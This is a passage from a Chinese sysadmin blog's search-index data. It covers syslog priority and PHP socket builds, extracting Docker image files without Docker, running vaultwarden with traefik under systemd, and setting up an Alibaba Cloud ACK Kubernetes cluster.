7 Debug: debug-level messages 计算方法就是 （facility*8 + severity），这里的22+0，可以理解成 local6 ，就是级别6\n如果发了一个 \u0026ldquo;local use 4\u0026rdquo; 和 Serverity = 5 的消息，那么就是 20×8+5=165 ，包头就是 \u0026lt;165\u0026gt;\n","permalink":"https://rendoumi.com/posts/20211028-php_syslog/","summary":"\u003cp\u003e给同事做了个 PHP 接口，转发发送短信的请求，同时要把发送记录发送到远程的 cacti 的 syslog 去\u003c/p\u003e\n\u003cp\u003e很简单，但是也不简单\u003c/p\u003e\n\u003cp\u003e首先是 PHP 服务器，是最简化编译的，php  -m 查了一下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ephp -m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[PHP Modules]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCore\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ectype\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecurl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efileinfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efilter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egettext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiconv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ejson\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibxml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epcre\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ePDO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epdo_sqlite\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ePhar\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eposix\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eReflection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esession\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSimpleXML\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSPL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esqlite3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estandard\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etokenizer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exmlreader\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exmlwriter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[Zend Modules]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e居然没有 socket 模块，没办法，找到源代码，编译一个安装，原有的 php 安装路径是 /export/servers/php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ tar zxvf php-7.4.0.tar.gz \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e php-7.4.0/sockets\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ /export/servers/php/bin/phpize\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./configure --enable-sockets --with-php-config\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/php/bin/php-config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e又看了一眼，是 php-fpm，居然没有 php.ini ，得，再生成一个，放在 /export/servers/php/lib/php.ini\u003c/p\u003e","title":"PHP程序如何发送syslog到远程服务器"},{"content":"用 kubernetes 越多，用 docker 越多，就愈发感觉到好处多多。\n简简单单的一个可执行文件，用 docker 基板 alphine 封装，就可以运行起一个 pod ，然后指定 deployment、svc、ingress，就可以将服务暴露出去。\n其实很多情况下单可执行文件 + systemd也是不错的选择。\n这不就遇到个问题，ghostunnel 这个软件，github 只释放出了源代码以及 windows 、linux 和 mac 的三个可执行版本。\n可我的执行环境是 nanopi ，是个 arm7 的架构，就无计可施了。\n无奈下，在 nanopi 上装了 go ，编译了个 arm7 的出来。\n但是遇到 vaultwanden ，rust 的，就没法弄了，vps 太弱，根本无法用 cargo 编译。\n那怎么办呢？方法如下，不安装 Docker ，也可以把镜像中的文件抽取出来\n$ mkdir vm $ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract $ chmod +x docker-image-extract $ ./docker-image-extract vaultwarden/server:alpine Getting API token... Getting image manifest for vaultwarden/server:alpine... Fetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e... Fetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc... Fetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318... Fetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0... Fetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739... Fetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5... Fetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148... Image contents extracted into ./output. 这样我们就可以在 output 目录下得到 vaultwarden 和 web-vault\n如果我们要拿到 arm7 的镜像，还需要再费点劲，以 ghostunnel 为例：\n访问： https://hub.docker.com/r/ghostunnel/ghostunnel/tags\n找到 linux/arm/v7 的 tag，40247f4b49c3\n点开后，找到 DIGEST: ，复制sha256以及后面的字串，sha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04\n按如下方法释放即可：\n$ ./docker-image-extract ghostunnel/ghostunnel:sha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04 不用担心目录结构，释放出来的文件会放到当前 output 目录下。\n","permalink":"https://rendoumi.com/posts/20211027-docker_extract_file/","summary":"\u003cp\u003e用 kubernetes 越多，用 docker 越多，就愈发感觉到好处多多。\u003c/p\u003e\n\u003cp\u003e简简单单的一个可执行文件，用 docker 基板 alphine 封装，就可以运行起一个 pod ，然后指定 deployment、svc、ingress，就可以将服务暴露出去。\u003c/p\u003e\n\u003cp\u003e其实很多情况下单可执行文件 + systemd也是不错的选择。\u003c/p\u003e\n\u003cp\u003e这不就遇到个问题，ghostunnel 这个软件，github 只释放出了源代码以及 windows 、linux 和 mac 的三个可执行版本。\u003c/p\u003e\n\u003cp\u003e可我的执行环境是 nanopi ，是个 arm7 的架构，就无计可施了。\u003c/p\u003e\n\u003cp\u003e无奈下，在 nanopi 上装了 go ，编译了个 arm7 的出来。\u003c/p\u003e\n\u003cp\u003e但是遇到 vaultwanden ，rust 的，就没法弄了，vps 太弱，根本无法用 cargo 编译。\u003c/p\u003e\n\u003cp\u003e那怎么办呢？方法如下，不安装 Docker ，也可以把镜像中的文件抽取出来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mkdir vm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ chmod +x docker-image-extract\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./docker-image-extract vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetting API token...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetting image manifest \u003cspan class=\"k\"\u003efor\u003c/span\u003e vaultwarden/server:alpine...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eImage contents extracted into ./output.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样我们就可以在 output 目录下得到 vaultwarden 和 web-vault\u003c/p\u003e","title":"没有装Docker如何从镜像中释放出文件"},{"content":"为什么会有非 Docker 环境这个怪字眼呢？\n无他，因为满网搜索到的教程都是在 Docker 环境下安装使用。\n但是穷啊，八戒的 vps 是个单核 500m 的 justhost 机器，便宜的很，这种廉价机器来跑 Docker，基本要占100M，跑不太动。\n这种一穷二白的环境，就只能把 Bitwarden 从容器里拆出来用。\n好在 Bitwarden_rs 是一个 rust 程序，占内存(16M左右)和cpu极少，本身就适合在 systemd 环境下跑。\n这里就利用 vaultwarden 和 traefik，在一台老破小服务器上运行。\n系统环境是 CentOS 7.9\n步骤如下：\n一、下载bitwarden(vaultwarden) wget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz 二、安装cargo并编译（可选） yum install -y epel-release yum install -y openssl-devel cargo cd vaultwarden-1.23.0 cargo build --release --features sqlite 直接爆错啊，小小的 vps 连编译都过不去，编译进程都被 kill 掉了\n三、下载vaultwarden主文件 编译不通，就只能想别的办法了。Faint\n找一台有 docker 机器，从里面把文件都解析出来好了\ndocker pull vaultwarden/server:alpine docker create --name vw vaultwarden/server:alpine docker cp vw:/vaultwarden . docker cp vw:/web-vault . docker rm vw 这样会得到一个可执行文件 vaultwarden 和一个目录 web-vault\n我们把这两个东西都挪到 /opt/vaultwarden 目录下，并且建立 data 文件夹，用来存放要生成的 sqlite3 数据文件。\nmkdir -p /opt/vaultwarden/data mv vaultwarden /opt/vaultwarden mv web-vault /opt/vaultwarden 四、生成systemd启动文件 注意，下面我们设置了 vaultwarden ROCKET_ADDRESS 的监听地址是 127.0.0.1 ，一是为了安全，二是为了下一步我们搭建 traefik，来反代 vaultwarden 用的；因为访问 vaultwarden 必须要加证书，而它本身是没有这个功能的，必须前置一个 nginx 或者 haproxy 或者 traefik 或者 carddy。\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/vaultwarden.service [Unit] Description=Bitwarden [Service] Type=simple Restart=always Environment=\u0026#34;ROCKET_ADDRESS=127.0.0.1\u0026#34; WorkingDirectory=/opt/vaultwarden ExecStart=/opt/vaultwarden/vaultwarden [Install] WantedBy=local.target EOF 五、配置traefik wget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz tar zxvf traefik_v2.4.8_linux_amd64.tar.gz mkdir -p /opt/traefik/dynamic mv traefik /opt/traefik 生成traefik配置文件，利用 traefik 自动申请 Let\u0026rsquo;s encrypt 证书\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/traefik.yml log: level: DEBUG api: insecure: false dashboard: true entryPoints: http: address: \u0026#34;:80\u0026#34; http: redirections: entryPoint: to: https scheme: https https: address: \u0026#34;:443\u0026#34; certificatesResolvers: letsEncrypt: acme: storage: /opt/traefik/acme.json email: zhangranrui@gmail.com tlsChallenge: {} httpChallenge: entryPoint: http providers: file: directory: /opt/traefik/dynamic watch: true 配置 vaultwarden 代理\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/dynamic/pass.yml http: routers: https_01: rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; service: svc_01 tls: certresolver: letsEncrypt http_01: rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; service: svc_01 entryPoints: - http services: svc_01: loadBalancer: servers: - url: \u0026#34;http://localhost:8000\u0026#34; EOF 设置 traefik 的 systemd 启动文件\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/traefik.service [Unit] Description=traefik [Service] Type=simple Restart=always WorkingDirectory=/export/servers/traefik ExecStart=/export/servers/traefik/traefik [Install] WantedBy=local.target EOF 五、启动vaultwarden和traefik systemctl daemon-reload systemctl enable --now vaultwarden systemctl enable --now traefik 打开页面，我们就成功的用一台老破小搭建了自己的密码管理服务器！！！\n","permalink":"https://rendoumi.com/posts/20211027-bitwarden/","summary":"\u003cp\u003e为什么会有非 Docker 环境这个怪字眼呢？\u003c/p\u003e\n\u003cp\u003e无他，因为满网搜索到的教程都是在 Docker 环境下安装使用。\u003c/p\u003e\n\u003cp\u003e但是穷啊，八戒的 vps 是个单核 500m 的 justhost 机器，便宜的很，这种廉价机器来跑 Docker，基本要占100M，跑不太动。\u003c/p\u003e\n\u003cp\u003e这种一穷二白的环境，就只能把 Bitwarden 从容器里拆出来用。\u003c/p\u003e\n\u003cp\u003e好在 Bitwarden_rs 是一个 rust 程序，占内存(16M左右)和cpu极少，本身就适合在 systemd 环境下跑。\u003c/p\u003e\n\u003cp\u003e这里就利用 vaultwarden 和 traefik，在一台老破小服务器上运行。\u003c/p\u003e\n\u003cp\u003e系统环境是 CentOS 7.9\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一下载bitwardenvaultwarden\"\u003e一、下载bitwarden(vaultwarden)\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二安装cargo并编译可选\"\u003e二、安装cargo并编译（可选）\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y openssl-devel cargo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e vaultwarden-1.23.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecargo build --release --features sqlite\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e直接爆错啊，小小的 vps 连编译都过不去，编译进程都被 kill 掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211027144917206\" loading=\"lazy\" src=\"/posts/20211027-bitwarden/image-20211027144917206.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"三下载vaultwarden主文件\"\u003e三、下载vaultwarden主文件\u003c/h2\u003e\n\u003cp\u003e编译不通，就只能想别的办法了。Faint\u003c/p\u003e\n\u003cp\u003e找一台有 docker 机器，从里面把文件都解析出来好了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker pull vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker create --name vw vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker cp vw:/vaultwarden .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker cp vw:/web-vault .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker rm vw\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样会得到一个可执行文件 vaultwarden 和一个目录 web-vault\u003c/p\u003e","title":"Bitwarden（vaultwarden）如何在非Docker环境下安装使用"},{"content":"在生产环境来创建阿里ACK托管k8s集群的过程：\n完全用于生产，不是搭建来做测试用的。\n授公司委托，给的RAM用户，所以阿里云RAM第一次登录后，强制修改密码\n然后授权资源管理， 正式开始建立过程\n一、准备条件 两台及以上ecs服务器\n阿里云账户余额100元以上（阿里云要求）\n阿里云oss一个（oss和ecs在一个区域最好）\n首先阿里云创建k8s集群要求至少有两台ecs服务器，可以创建集群的时候再购买，不要预先购买。\n二、下面开始创建： 阿里云最左上角的菜单（新版本首页）-\u0026gt;产品与服务-\u0026gt;容器服务kubernetes版本\n第一次创建会让开启ram授权，正常点击授权就可以\n点击创建集群\n点击后如下\n各个选项的详细说明：\n第一部分：\n集群版本： 最上面可以选择ACK托管版，和其他4个版本，着重说一下专有版和托管版的区别\n专有版本：master和worker都需要自己创建，如果需要高可用，那么master需要至少三个，也就是说，如果你不想把master和worker放在同一台服务器上，就要多使用三台服务器。\nACK托管版：master由阿里云给创建，自己只需要购买worker服务器。\n集群名称： k8s-hbb\n地域： 请选择自己ecs和rds等资源所在区域，这里是华东2（上海）\nKubernetes版本：阿里云已经做好充分的测试了，所以选择默认的即可。这里是 1.18.8-aliyun.1\n容器运行时： Docker 19.03.5\n第二部分：\n专有网络: 专有网络选择和ecs，rds同一个专有网络，这里是vpc-uf6pcr7nvp3dqmx86yyk0，网段是172.19.0.0/16\n虚拟交换机： 同一个专有网络下面的交换机是可以互通的，这里新建一个虚拟交换机，网段是172.19.240.0/20\n网络插件： 选Flannel，除去阿里云自己的区别描述，还有一点 如果使用flannel插件，则worker端对外，访问外网（比如短信接口等）使用的是worder所在ecs自己的eip或者如果使用的是snat模式，就是snat绑定的eip。如果使用的terway插件则走的就是snat的eip。注意，创建集群成功后，会为集群创建一个对外服务的ingress的slb，worker内部的容器直接对外访问，使用的不是这个slb的ip。slb只是进来的通道。\npod网络 CIDR：为统一起见，10.240.0.0/20\nservice CIDR：为统一起见，192.168.240.0/20\n注意以上 建立好了三个网段，三个网段中均有240字段，便于记忆\nECS(2台)：172.19.240.0/20\nPOD网段：10.240.0.0/20\nService网段：192.168.240.0/20 ​\n节点IP数量：256，指单个节点可运行 Pod 数量的上限。 一定要拉到最大量256 ，弄到16的话，一个节点本身要跑10多个system的pod，就无法跑应用pod了。\n第三部分:\n配置SNAT：必选配置SNAT，对外主动访问的时候IP需要一致。解释：如果ecs没有访问外网能力，则必须使用snat，snat就是把vpc绑定一个eip，然后给内部的ecs使用nat方式主动外出访问用的，比如主动反问第三方的接口等。如果ecs自己已经绑定了eip或者自带ip带宽，可以不选择。\nAPISERVER访问：必选公网EIP暴露，这个绑定以后ip不收费，可以使用流量包，管理master用的。如果要使用『云效』必选。\n默认不选中使用EIP暴露API Server。 API Server提供了各类资源对象（Pod，Service等）的增删改查及watch等HTTP Rest接口。 - 如果选择开放，会创建一个EIP，并挂载到内网SLB上。此时，Master节点的6443端口（对应API Server）暴露出来，用户可以在外网通过kubeconfig连接并操作集群。 - 如果选择不开放，则不会创建EIP，您只能在VPC内部用kubeconfig连接并操作集群。\nRDS白名单：这个注意选择，目前阿里云显示出来的只有普通的mysql-rds，redis的和polardb的都不显示\n安全组：选择企业类型就可以，后期可以修改规则。\n第四部分\nKube-proxy模式：选IPVS，比IPTABLES性能高\n集群本地域名： hbb.local，.local结尾的统统是本地域名\n下一步，增加worker\n必须选新增实例，不要选择现有实例\n新增实例：就是新购买ecs，要注意自己选择vpc和交换机\n选择已有实例：可以选择现有的服务器，注意：现有服务器会被更换硬盘，硬盘内容会被清空。\n企业级实例规格族\n实例规格族名称格式为ecs.\u0026lt;规格族\u0026gt;，实例规格名称为ecs.\u0026lt;规格族\u0026gt;.large。\necs：云服务器ECS的产品代号。 \u0026lt;规格族\u0026gt;：由小写字母加数字组成。 小写字母为某个单词的缩写，并标志着规格族的性能领域。部分小写字母的含义如下所示。 c：一般表示计算型（computational） g：一般表示通用型（general） r：一般表示内存型（ram） ne：一般表示网络增强型（network enhanced） 数字一般区别同类型规格族间的发布时间。更大的数字代表新一代规格族，拥有更高的性价比，价格低性能好。 large：n越大，vCPU核数越多。 例如，ecs.g6.2xlarge表示通用型g6规格族中的一个实例规格，拥有8个vCPU核。相比于g5规格族，g6为新一代通用型实例规格族。\n按上面选ecs.c6.large，费用0.95/时，似乎比ecs.n1.medium 1.34/时好。\n节点数量：最少是2个，无法减到0，没办法。\n系统盘：选ESSD，速度快，40G即可。不要开云盘备份，会要求设置snapshot策略，要收钱。\n操作系统：选CentOS 7.9，不要选aliyun的自定义版本。更加标准化，便于升级。\n这里选择操作系统的时候，只有两个系统可以选择，一个是centos7，一个是阿里云linux。为什么操作系统不能选很多种？因为阿里云要使用Cloud-init自动安装docker的各种工具包进作为worker角色的ecs，所以他对系统的要求更高，否则很可能出现各种各样的问题。这里才会有这种限制。\n密钥对选则新建一个k8s-ssh。\n下一步组件配置\n安装ingress组件：需要对外服务，这个必选，会给分配一个slb负载均衡\n如果想K8S集群的服务直接提供服务给用户访问，可以选择『公网』，它会创建一个SLB并用EIP暴露公网，后端是k8s-ingress入口。\n负载类型： 公网，对外服务就要写公网。\n存储插件： 必选CSI，对之后创建数据卷语法没影响\n监控插件： 基础版是免费的，可以放心使用\n日志服务： 日志服务可以加，尤其是以后如果想采集内部doker里面的日志，这里还是推荐加一下最好，他会自动创建标记采集，后面使用这个标记可以方便的自动添加日志节点。\nslb费用： 0.66/小时,带宽费用0.8/g\n下一步确认配置\n核对一下是否和自己选择的一样\n核对无误后点击创建集群。注意：创建集群的时候，会检测一些权限，如果权限未开通，可以令开页面进行开通授权，比如ess弹性伸缩，开通后点小按钮刷新状态， 状态都ok以后，点击创建集群。\n等待十分钟左右集群创建成功。到此创建集群已经完成。\n然后到控制台可以查看，这样ACK集群就创建好了。\n后记：\n毁掉ACK的时候，切忌去删除arms-prom的helm，再删除ack集群，否则会清不干净东西。\n下次重建的时候会装不上prometheus\n","permalink":"https://rendoumi.com/posts/20211026-ack_build/","summary":"\u003cp\u003e在生产环境来创建阿里ACK托管k8s集群的过程：\u003c/p\u003e\n\u003cp\u003e完全用于生产，不是搭建来做测试用的。\u003c/p\u003e\n\u003cp\u003e授公司委托，给的RAM用户，所以阿里云RAM第一次登录后，强制修改密码\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211026125509729\" loading=\"lazy\" src=\"/posts/20211026-ack_build/image-20211026125509729.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后授权资源管理，   正式开始建立过程\u003c/p\u003e\n\u003ch2 id=\"一准备条件\"\u003e一、准备条件\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e两台及以上ecs服务器\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e阿里云账户余额100元以上（阿里云要求）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e阿里云oss一个（oss和ecs在一个区域最好）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e首先阿里云创建k8s集群要求至少有两台ecs服务器，可以创建集群的时候\u003cstrong\u003e再购买\u003c/strong\u003e，不要预先购买。\u003c/p\u003e\n\u003ch2 id=\"二下面开始创建\"\u003e二、下面开始创建：\u003c/h2\u003e\n\u003cp\u003e阿里云最左上角的菜单（新版本首页）-\u0026gt;产品与服务-\u0026gt;容器服务kubernetes版本\u003c/p\u003e\n\u003cp\u003e第一次创建会让开启ram授权，正常点击授权就可以\u003c/p\u003e\n\u003cp\u003e\u003cimg 